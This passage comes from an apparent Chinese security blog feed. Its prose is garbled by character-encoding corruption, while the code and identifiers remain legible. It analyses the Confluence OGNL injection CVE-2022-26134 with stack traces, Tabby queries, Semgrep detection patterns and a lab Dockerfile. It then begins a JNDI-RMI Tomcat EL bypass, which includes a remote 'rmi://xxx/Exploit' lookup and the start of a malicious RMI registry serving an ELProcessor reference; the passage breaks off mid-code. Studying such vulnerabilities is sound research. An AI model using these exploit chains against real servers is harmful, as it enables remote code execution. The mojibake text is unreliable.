(com.atlassian.confluence.servlet)</span><br><span class="line">service:199, ServletDispatcher (com.opensymphony.webwork.dispatcher)</span><br><span class="line">service:764, HttpServlet (javax.servlet.http)</span><br></pre></td></tr></table></figure><h2 id="0x03-æ€è·¯é€†å‘"><a href="#0x03-æ€è·¯é€†å‘" class="headerlink" title="0x03 æ€è·¯é€†å‘"></a>0x03 æ€è·¯é€†å‘</h2><p>å…³äºæ¼æ´å¦‚ä½•å‘ç°çš„ï¼Œä¸ªäººç†è§£å¯ä»¥æ‹†åˆ†æˆ3ä¸ªé˜¶æ®µ</p><ol><li>å¦‚ä½•å®šä½åˆ°å»æŒ–confluence</li><li>å¦‚ä½•å‘ç°ognlæ”»å‡»é¢ï¼Œä¹Ÿå³sinkç‚¹</li><li>å¦‚ä½•ä»sinkç‚¹æ¨å¯¼å‡ºsourceåŠpath</li></ol><p>è¿™äº›éƒ½æ˜¯å¾ˆæœ‰æ„æ€çš„ç‚¹ï¼Œå€¼å¾—æ€è€ƒã€‚è¿™é‡Œä¹Ÿåªå°è¯•é€†å‘åˆ†ææ­¥éª¤3çš„æ€è·¯ï¼Œæ­¥éª¤1ã€2å¤ªè¿‡å®½æ³›äº†æœ‰æ—¶é—´å†åšæ¢è®¨ã€‚</p><h3 id="sink-åˆ°source"><a href="#sink-åˆ°source" class="headerlink" title="sink åˆ°source"></a>sink åˆ°source</h3><p>sink ç‚¹å…¶å®å¾ˆæ˜æ˜¾ï¼Œognl.getValueï¼Œåœ¨æ­¤åŸºç¡€ä¸Šå¦‚ä½•æ‰¾åˆ°å®Œæ•´çš„è§¦å‘é“¾ï¼Ÿ</p><p>sourceç‚¹åœ¨javax.servlet.http.HttpServlet#serviceï¼Œéœ€è¦å¯¹confluence ç»“æ„æœ‰ä¸€å®šäº†è§£ï¼Œæˆ–è€…è¦è°ƒè¯•ä¸‹å†å²çš„æ¼æ´ï¼Œåº”è¯¥èƒ½å®šä½åˆ°è¿™é‡Œã€‚</p><p>å¦‚ä½•æ‰¾å‡ºä¸­é—´çš„é“¾ï¼Œconfluenceæ²¡æœ‰æºç ï¼Œæ‰€ä»¥tabby æˆ–è€… ByteCodeDLï¼Ÿ</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -Xmx6g -jar build&#x2F;libs&#x2F;tabby-1.1.0.RELEASE.jar ..&#x2F;confluence&#x2F;atlassian-confluence-7.13.6&#x2F;confluence&#x2F;WEB-INF&#x2F;lib&#x2F; --isJDKProcess</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F; confluence CVE-2022-26134</span><br><span class="line">match (source:Method &#123;NAME:&quot;service&quot;&#125;) where source.CLASSNAME &#x3D;~ &quot;.*ServletDispatcher&quot;</span><br><span class="line">match (sink:Method &#123;NAME:&quot;translateVariables&quot;, CLASSNAME:&quot;com.opensymphony.xwork.util.TextParseUtil&quot;&#125;) </span><br><span class="line">call apoc.algo.allSimplePaths(source,sink,&quot;&gt;CALL|ALIAS&quot;,9) yield path </span><br><span class="line">return path</span><br></pre></td></tr></table></figure><p><img src="/images/pasted-214.png" alt="upload successful"></p><p>Y4å¸ˆå‚…æåˆ°çš„ä¸€äº›å…¶ä»–çš„ *Result#executeï¼Œå¯ä»¥çœ‹åˆ°éƒ¨åˆ†ä¹Ÿåœ¨è·¯å¾„é‡Œé¢ã€‚</p><h3 id="sink-ç‚¹çš„å®šä½"><a href="#sink-ç‚¹çš„å®šä½" class="headerlink" title="sink ç‚¹çš„å®šä½"></a>sink ç‚¹çš„å®šä½</h3><p>Semgrep å¯¹äºæ‰¾sinkç‚¹ï¼Œå’Œæ­£åˆ™ç›¸æ¯”æœ‰ä¸€äº›ä¼˜åŠ¿ï¼Œä¸è¿‡ç›®å‰è§„åˆ™ä¹Ÿä¸å…¨ã€‚</p><figure class="highlight yml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="bullet">-</span> <span class="attr">pattern-either:</span></span><br><span class="line">    <span class="bullet">-</span> <span class="attr">pattern:</span> <span class="string">|</span></span><br><span class="line">       <span class="string">ognl.Ognl.getValue(...)</span></span><br><span class="line">    <span class="bullet">-</span> <span class="attr">pattern:</span> <span class="string">|</span></span><br><span class="line">       <span class="string">ognl.Ognl.setValue(...)</span></span><br><span class="line">    <span class="bullet">-</span> <span class="attr">pattern:</span> <span class="string">|</span></span><br><span class="line">        <span class="string">$X.translateVariables(...</span> <span class="string">,</span> <span class="string">...)</span></span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">semgrep --config=java/lang/security/audit/ognl-injection2.yaml ~/study/java/confluence/confluence-home/jars/</span><br></pre></td></tr></table></figure><p><img src="/images/pasted-218.png" alt="upload successful"></p><p>å¯¹äºjarç±»å‹ï¼Œå¦‚æœè¦å®ç°å®Œå…¨è‡ªåŠ¨åŒ–è¿˜æ˜¯æ¯”è¾ƒå›°éš¾ã€‚åç¼–è¯‘ã€è‡ªåŠ¨åŒ–è¿è¡Œsemgrepè§„åˆ™ã€å†ä»sinkç‚¹å‡ºå‘ç”¨Tabbyæ‰¾è·¯å¾„ã€‚ç›®å‰ä¹Ÿæ²¡æœ‰å¥½çš„æ€è·¯ï¼Œå­¦ä¹ ã€Šè½¯ä»¶åˆ†æã€‹å§ã€‚</p><h2 id="0x04-è¡¥ä¸åˆ†æ"><a href="#0x04-è¡¥ä¸åˆ†æ" class="headerlink" title="0x04 è¡¥ä¸åˆ†æ"></a>0x04 è¡¥ä¸åˆ†æ</h2><p><img src="/images/pasted-215.png" alt="upload successful"><br>åªæ˜¯ä¿®äº†ActionChainResult ä¸­çš„translateVariablesã€‚ä½†æ˜¯å…¶ä»–çš„Ognl ç‚¹ä¹Ÿæ²¡æ‰¾åˆ°è§¦å‘é“¾ã€‚</p><h2 id="0x05-å°ç»“"><a href="#0x05-å°ç»“" class="headerlink" title="0x05 å°ç»“"></a>0x05 å°ç»“</h2><p>æœ¬æ–‡ç®€ç•¥çš„è·Ÿè¸ªäº†Confluence CVE-2022-26134 OGNLçš„æ¼æ´è°ƒç”¨æµç¨‹ï¼Œå¹¶åœ¨æ­¤åŸºç¡€ä¸Šæ¢ç´¢å…¶OGNLè°ƒç”¨é“¾çš„å‘ç°æ€è·¯ã€‚åˆ†æäº†è¡¥ä¸ï¼Œå°è¯•æŒ–æ˜å…¶ä»–çš„è§¦å‘é“¾ï¼Œä½†æ˜¯æ— æœã€‚åŸºæœ¬å†…å®¹Y4å¸ˆå‚…çš„æ–‡ç« åŸºæœ¬éƒ½æœ‰äº†ï¼Œæœ¬æ–‡æ²¡ä»€ä¹ˆæ–°çš„ä¸œè¥¿ã€‚</p><p>æ€»çš„æ¥è¯´è¿™ä¸ªæ´åŸç†å¹¶ä¸éš¾ï¼Œst2 çš„ognlä¹Ÿæ˜¯ç»å…¸çš„æ¼æ´äº†ï¼Œä½†æ˜¯ä¸ºä»€ä¹ˆæ˜¯é»‘äº§èµ°åœ¨äº†æŠ€æœ¯å‰æ²¿ï¼Ÿçº¯æŠ€æœ¯è€Œè¨€ï¼ŒåŸç†ä¸éš¾ï¼Œä½†æ˜¯è¾ƒéš¾è‡ªåŠ¨åŒ–ï¼Œä¸»åŠ¨æŒ–æ˜ä¹Ÿéœ€è¦ä¸€å®šçš„æ¼æ´å†å²çŸ¥è¯†ã€‚</p><p>è€æ ·å­ç•™ä¸ªå‘å§</p><ol><li>åªæ ¹æ®è¡¥ä¸ï¼Œèƒ½å¤Ÿç‹¬ç«‹åˆ†æå‡ºPOCå—ï¼ŸPSï¼šä¸šå†…è°æœ€å…ˆæå‡ºpocçš„</li><li>æ€ä¹ˆä¼šæƒ³åˆ°åˆ°å»æŒ–confluenceçš„ï¼Ÿ</li><li>å¦‚ä½•å‘ç°OGNLæ”»å‡»é¢ï¼Ÿ</li></ol><p>æœªå®Œå¾…ç»­ã€‚ã€‚ã€‚</p><h2 id="0x06-å‚è€ƒ"><a href="#0x06-å‚è€ƒ" class="headerlink" title="0x06 å‚è€ƒ"></a>0x06 å‚è€ƒ</h2><ul><li>[1]<a href="https://github.com/vulhub/vulhub/tree/master/confluence/CVE-2022-26134">Confluence Pre-Auth Remote Code Execution via OGNL Injection (CVE-2022-26134) (by:phith0n)</a></li><li>[2]<a href="https://y4er.com/post/cve-2022-26134-confluence-server-data-center-ognl-rce/">CVE-2022-26134 Confluence Server Data Center OGNL RCE (by:Y4er)</a></li><li>[3]<a href="https://confluence.atlassian.com/doc/confluence-security-advisory-2022-06-02-1130377146.html">Confluence Security Advisory 2022-06-02</a></li></ul>]]></content>
    
    
    <summary type="html">&lt;!-- æ—¥æ‹±ä¸€å’ï¼ŒåŠŸä¸å”æã€‚--&gt;

&lt;p&gt;å‘ç°åŠå¹´æ²¡å†™æ–‡ç« äº†ã€‚ã€‚ã€‚&lt;/p&gt;
&lt;h2 id=&quot;0x01-ç¯å¢ƒæ­å»º&quot;&gt;&lt;a href=&quot;#0x01-ç¯å¢ƒæ­å»º&quot; class=&quot;headerlink&quot; title=&quot;0x01 ç¯å¢ƒæ­å»º&quot;&gt;&lt;/a&gt;0x01 ç¯å¢ƒæ­å»º&lt;/h2&gt;&lt;p&gt;PğŸ®çš„Vulhub æœ‰é•œåƒäº†ï¼Œä¸è¿‡è°ƒè¯•æ¥å£æ²¡æœ‰å¼€å‡ºæ¥ï¼Œè¿™é‡Œç¨å¾®è¡¥å……ä¸‹ã€‚&lt;/p&gt;
&lt;p&gt;åœ¨vulhub/confluence/CVE2022-26134 ç›®å½•ä¸‹&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;æ–°å»ºDockerfile&lt;/li&gt;
&lt;/ol&gt;
&lt;figure class=&quot;highlight dockerfile&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;FROM&lt;/span&gt; vulhub/confluence:&lt;span class=&quot;number&quot;&gt;7.13&lt;/span&gt;.&lt;span class=&quot;number&quot;&gt;6&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;RUN&lt;/span&gt;&lt;span class=&quot;bash&quot;&gt; sed &lt;span class=&quot;string&quot;&gt;&amp;quot;106 iCATALINA_OPTS=\&amp;quot;-agentlib:jdwp=transport=dt_socket,server=y,suspend=n,address=*:5005 \$\&amp;#123;CATALINA_OPTS\&amp;#125;\&amp;quot;&amp;quot;&lt;/span&gt; -i /opt/atlassian/confluence/bin/setenv.sh&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;ol start=&quot;2&quot;&gt;
&lt;li&gt;æ›´æ–°docker-compose.yml&lt;/li&gt;
&lt;/ol&gt;
&lt;figure class=&quot;highlight yaml&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;attr&quot;&gt;build:&lt;/span&gt; &lt;span class=&quot;string&quot;&gt;.&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;# image: vulhub/confluence:7.13.6&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;attr&quot;&gt;ports:&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  &lt;span class=&quot;bullet&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;string&quot;&gt;&amp;quot;8090:8090&amp;quot;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  &lt;span class=&quot;bullet&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;string&quot;&gt;&amp;quot;5005:5005&amp;quot;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;


&lt;figure class=&quot;highlight bash&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;docker-compose up -d&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;</summary>
    
    
    
    <category term="Javaå®‰å…¨" scheme="http://m0d9.me/categories/Java%E5%AE%89%E5%85%A8/"/>
    
    <category term="æ¼æ´åˆ†æ" scheme="http://m0d9.me/categories/Java%E5%AE%89%E5%85%A8/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"/>
    
    
    <category term="Confluence" scheme="http://m0d9.me/tags/Confluence/"/>
    
    <category term="OGNL" scheme="http://m0d9.me/tags/OGNL/"/>
    
  </entry>
  
  <entry>
    <title>JNDI-RMI æ³¨å…¥çš„EL ç»•è¿‡æ€è·¯åˆ†æ</title>
    <link href="http://m0d9.me/2021/12/17/JNDI-RMI-LDAP%E6%B3%A8%E5%85%A5%E7%BB%95%E8%BF%87%E9%80%86%E5%90%91%E5%88%86%E6%9E%90/"/>
    <id>http://m0d9.me/2021/12/17/JNDI-RMI-LDAP%E6%B3%A8%E5%85%A5%E7%BB%95%E8%BF%87%E9%80%86%E5%90%91%E5%88%86%E6%9E%90/</id>
    <published>2021-12-17T06:11:00.000Z</published>
    <updated>2022-03-18T06:26:23.093Z</updated>
    
    <content type="html"><![CDATA[<p><img src="/images/pasted-203.png" alt="upload successful"></p><p>ä¸Šé¢çš„JNDI æ³¨å…¥çš„JDK ç‰ˆæœ¬é™åˆ¶å·²ç»è€³ç†Ÿèƒ½è¯¦äº†ï¼Œé’ˆå¯¹JNDI-RMI çš„tomcat EL ç»•è¿‡å§¿åŠ¿ä¹Ÿè¢«ç»å¸¸æèµ·ï¼Œæœ¬æ–‡å°è¯•å›æº¯è¿™ä¸€å§¿åŠ¿çš„å‘ç°è¿‡ç¨‹ã€‚</p><h2 id="JNDI-RMI-æ³¨å…¥"><a href="#JNDI-RMI-æ³¨å…¥" class="headerlink" title="JNDI-RMI æ³¨å…¥"></a>JNDI-RMI æ³¨å…¥</h2><h3 id="èƒŒæ™¯çŸ¥è¯†"><a href="#èƒŒæ™¯çŸ¥è¯†" class="headerlink" title="èƒŒæ™¯çŸ¥è¯†"></a>èƒŒæ™¯çŸ¥è¯†</h3><p>å¿…é¡»äº†è§£ä¸¤ä¸ªé‡è¦çš„ç±»</p><ul><li>com.sun.jndi.rmi.registry.RegistryContextï¼š JNDI-RMIæ¥å£</li><li>java.rmi.registry.Registryï¼š RMI æ¥å£</li></ul><p>é€šå¸¸æ”»å‡»åœºæ™¯ä¸‹ï¼ŒRegistryæ˜¯ä½œä¸ºRMIæœåŠ¡ç«¯ï¼ŒRegistryContextæ˜¯ä½œä¸ºæ”»å‡»çš„clientç«¯ï¼Œä¹Ÿå°±æ˜¯vulnã€‚</p><a id="more"></a><h2 id="ä½ç‰ˆæœ¬æ³¨å…¥è¿‡ç¨‹ï¼šRegistryContext-lookup"><a href="#ä½ç‰ˆæœ¬æ³¨å…¥è¿‡ç¨‹ï¼šRegistryContext-lookup" class="headerlink" title="ä½ç‰ˆæœ¬æ³¨å…¥è¿‡ç¨‹ï¼šRegistryContext#lookup"></a>ä½ç‰ˆæœ¬æ³¨å…¥è¿‡ç¨‹ï¼šRegistryContext#lookup</h2><p>éƒ½åœ¨RegistryContext#lookup é‡Œé¢ï¼Œå¸¸è§çš„å¦‚ ctx.lookup(â€œrmi://xxx/Exploitâ€)ï¼Œè¢«æ”»å‡»è¿‡ç¨‹å¦‚ä¸‹</p><ul><li>registry#lookup è·å–è¿œç¨‹æ¶æ„server ç»‘å®šçš„Remote ç±»</li><li>registry#decodeObject è°ƒç”¨è¯¥Remoteç±» çš„getObjectInstance å®ä¾‹åŒ–è¯¥ç±»</li></ul><p>com.sun.jndi.rmi.registry.RegistryContext</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">   <span class="keyword">private</span> Registry registry;</span><br><span class="line"><span class="function"><span class="keyword">public</span> Object <span class="title">lookup</span><span class="params">(Name var1)</span> <span class="keyword">throws</span> NamingException </span>&#123;</span><br><span class="line">       <span class="keyword">if</span> (var1.isEmpty()) &#123;</span><br><span class="line">           <span class="keyword">return</span> <span class="keyword">new</span> RegistryContext(<span class="keyword">this</span>);</span><br><span class="line">       &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">           Remote var2;</span><br><span class="line">           <span class="keyword">try</span> &#123;</span><br><span class="line">               var2 = <span class="keyword">this</span>.registry.lookup(var1.get(<span class="number">0</span>));</span><br><span class="line">           &#125; <span class="keyword">catch</span> (NotBoundException var4) &#123;</span><br><span class="line">               <span class="keyword">throw</span> <span class="keyword">new</span> NameNotFoundException(var1.get(<span class="number">0</span>));</span><br><span class="line">           &#125; <span class="keyword">catch</span> (RemoteException var5) &#123;</span><br><span class="line">               <span class="keyword">throw</span> (NamingException)wrapRemoteException(var5).fillInStackTrace();</span><br><span class="line">           &#125;</span><br><span class="line"></span><br><span class="line">           <span class="keyword">return</span> <span class="keyword">this</span>.decodeObject(var2, var1.getPrefix(<span class="number">1</span>));</span><br><span class="line">       &#125;</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   <span class="function"><span class="keyword">private</span> Object <span class="title">decodeObject</span><span class="params">(Remote var1, Name var2)</span> <span class="keyword">throws</span> NamingException </span>&#123;</span><br><span class="line">       <span class="keyword">try</span> &#123;</span><br><span class="line">           Object var3 = var1 <span class="keyword">instanceof</span> RemoteReference ? ((RemoteReference)var1).getReference() : var1;</span><br><span class="line">           <span class="keyword">return</span> NamingManager.getObjectInstance(var3, var2, <span class="keyword">this</span>, <span class="keyword">this</span>.environment);</span><br></pre></td></tr></table></figure><p>javax.naming.spi.NamingManager#getObjectInstance</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> Object</span><br><span class="line">        getObjectInstance(Object refInfo, Name name, Context nameCtx,</span><br><span class="line">                          Hashtable&lt;?,?&gt; environment)</span><br><span class="line">        <span class="keyword">throws</span> Exception</span><br><span class="line">    &#123;</span><br><span class="line"></span><br><span class="line">        ObjectFactory factory;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Use builder if installed</span></span><br><span class="line">        ObjectFactoryBuilder builder = getObjectFactoryBuilder();</span><br><span class="line">        <span class="keyword">if</span> (builder != <span class="keyword">null</span>) &#123;</span><br><span class="line">            <span class="comment">// builder must return non-null factory</span></span><br><span class="line">            factory = builder.createObjectFactory(refInfo, environment);</span><br><span class="line">            <span class="keyword">return</span> factory.getObjectInstance(refInfo, name, nameCtx,</span><br><span class="line">                environment);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Use reference if possible</span></span><br><span class="line">        Reference ref = <span class="keyword">null</span>;</span><br><span class="line">        <span class="keyword">if</span> (refInfo <span class="keyword">instanceof</span> Reference) &#123;</span><br><span class="line">            ref = (Reference) refInfo;</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (refInfo <span class="keyword">instanceof</span> Referenceable) &#123;</span><br><span class="line">            ref = ((Referenceable)(refInfo)).getReference();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        Object answer;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (ref != <span class="keyword">null</span>) &#123;</span><br><span class="line">            String f = ref.getFactoryClassName();</span><br><span class="line">            <span class="keyword">if</span> (f != <span class="keyword">null</span>) &#123;</span><br><span class="line">                <span class="comment">// if reference identifies a factory, use exclusively</span></span><br><span class="line"></span><br><span class="line">                factory = getObjectFactoryFromReference(ref, f);</span><br><span class="line">                <span class="keyword">if</span> (factory != <span class="keyword">null</span>) &#123;</span><br><span class="line">                    <span class="keyword">return</span> factory.getObjectInstance(ref, name, nameCtx,</span><br><span class="line">                                                     environment);</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="comment">// No factory found, so return original refInfo.</span></span><br><span class="line">                <span class="comment">// Will reach this point if factory class is not in</span></span><br><span class="line">                <span class="comment">// class path and reference does not contain a URL for it</span></span><br><span class="line">                <span class="keyword">return</span> refInfo;</span><br><span class="line"></span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="comment">// if reference has no factory, check for addresses</span></span><br><span class="line">                <span class="comment">// containing URLs</span></span><br><span class="line"></span><br><span class="line">                answer = processURLAddrs(ref, name, nameCtx, environment);</span><br><span class="line">                <span class="keyword">if</span> (answer != <span class="keyword">null</span>) &#123;</span><br><span class="line">                    <span class="keyword">return</span> answer;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// try using any specified factories</span></span><br><span class="line">        answer =</span><br><span class="line">            createObjectFromFactories(refInfo, name, nameCtx, environment);</span><br><span class="line">        <span class="keyword">return</span> (answer != <span class="keyword">null</span>) ? answer : refInfo;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>æ³¨æ„æ­¤å¤„ï¼Œå¦‚æœæ˜¯Reference å¯¹è±¡ï¼Œåˆ™ä¼šgetObjectFactoryFromReference - getObjectInstance è¿›è¡Œå®ä¾‹åŒ–ï¼Œä¹Ÿå°±æ˜¯åŸæœ¬çš„JNDI-RMIåˆ©ç”¨æµç¨‹ã€‚</p><h3 id="é«˜ç‰ˆæœ¬é™åˆ¶ï¼šRegistryContext-decodeObject"><a href="#é«˜ç‰ˆæœ¬é™åˆ¶ï¼šRegistryContext-decodeObject" class="headerlink" title="é«˜ç‰ˆæœ¬é™åˆ¶ï¼šRegistryContext#decodeObject"></a>é«˜ç‰ˆæœ¬é™åˆ¶ï¼šRegistryContext#decodeObject</h3><blockquote><p>åœ¨JDK 6u132, JDK 7u122, JDK 8u113 ä¸­Javaæå‡äº†JNDI é™åˆ¶äº†Naming/DirectoryæœåŠ¡ä¸­JNDI Referenceè¿œç¨‹åŠ è½½Object Factoryç±»çš„ç‰¹æ€§ã€‚ç³»ç»Ÿå±æ€§ com.sun.jndi.rmi.object.trustURLCodebaseã€com.sun.jndi.cosnaming.object.trustURLCodebase çš„é»˜è®¤å€¼å˜ä¸ºfalseï¼Œå³é»˜è®¤ä¸å…è®¸ä»è¿œç¨‹çš„CodebaseåŠ è½½Referenceå·¥å‚ç±»ã€‚å¦‚æœéœ€è¦å¼€å¯ RMI Registry æˆ–è€… COS Naming Service Providerçš„è¿œç¨‹ç±»åŠ è½½åŠŸèƒ½ï¼Œéœ€è¦å°†å‰é¢è¯´çš„ä¸¤ä¸ªå±æ€§å€¼è®¾ç½®ä¸ºtrueã€‚</p></blockquote><p>å®ç°trustURLCodebase çš„é€»è¾‘åœ¨decodeObject ä¸Š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">    <span class="function"><span class="keyword">private</span> Object <span class="title">decodeObject</span><span class="params">(Remote var1, Name var2)</span> <span class="keyword">throws</span> NamingException </span>&#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">...</span><br><span class="line">            <span class="keyword">if</span> (var8 != <span class="keyword">null</span> &amp;&amp; var8.getFactoryClassLocation() != <span class="keyword">null</span> &amp;&amp; !trustURLCodebase) &#123;</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> ConfigurationException(<span class="string">&quot;The object factory is untrusted. Set the system property &#x27;com.sun.jndi.rmi.object.trustURLCodebase&#x27; to &#x27;true&#x27;.&quot;</span>);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">return</span> NamingManager.getObjectInstance(var3, var2, <span class="keyword">this</span>, <span class="keyword">this</span>.environment);</span><br><span class="line">...</span><br><span class="line">    <span class="keyword">static</span> &#123;</span><br><span class="line">        PrivilegedAction var0 = () -&gt; &#123;</span><br><span class="line">            <span class="keyword">return</span> System.getProperty(<span class="string">&quot;com.sun.jndi.rmi.object.trustURLCodebase&quot;</span>, <span class="string">&quot;false&quot;</span>);</span><br><span class="line">        &#125;;</span><br><span class="line">        String var1 = (String)AccessController.doPrivileged(var0);</span><br><span class="line">        trustURLCodebase = <span class="string">&quot;true&quot;</span>.equalsIgnoreCase(var1);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><h3 id="TOMCAT-ELçš„ç»•è¿‡"><a href="#TOMCAT-ELçš„ç»•è¿‡" class="headerlink" title="TOMCAT ELçš„ç»•è¿‡"></a>TOMCAT ELçš„ç»•è¿‡</h3><p>éƒ½çŸ¥é“tomcat ELå¯ä»¥å®ç°ç»•è¿‡</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">System.setProperty(<span class="string">&quot;java.rmi.server.logCalls&quot;</span>, <span class="string">&quot;true&quot;</span>);</span><br><span class="line">Registry registry = LocateRegistry.createRegistry(<span class="number">1099</span>);</span><br><span class="line"><span class="comment">// å®ä¾‹åŒ–Referenceï¼ŒæŒ‡å®šç›®æ ‡ç±»ä¸ºjavax.el.ELProcessorï¼Œå·¥å‚ç±»ä¸ºorg.apache.naming.factory.BeanFactory</span></span><br><span class="line">ResourceRef ref = <span class="keyword">new</span> ResourceRef(<span class="string">&quot;javax.el.ELProcessor&quot;</span>, <span class="keyword">null</span>, <span class="string">&quot;&quot;</span>, <span class="string">&quot;&quot;</span>, <span class="keyword">true</span>,<span class="string">&quot;org.apache.naming.factory.BeanFactory&quot;</span>,<span class="keyword">null</span>);</span><br><span class="line"><span class="comment">// 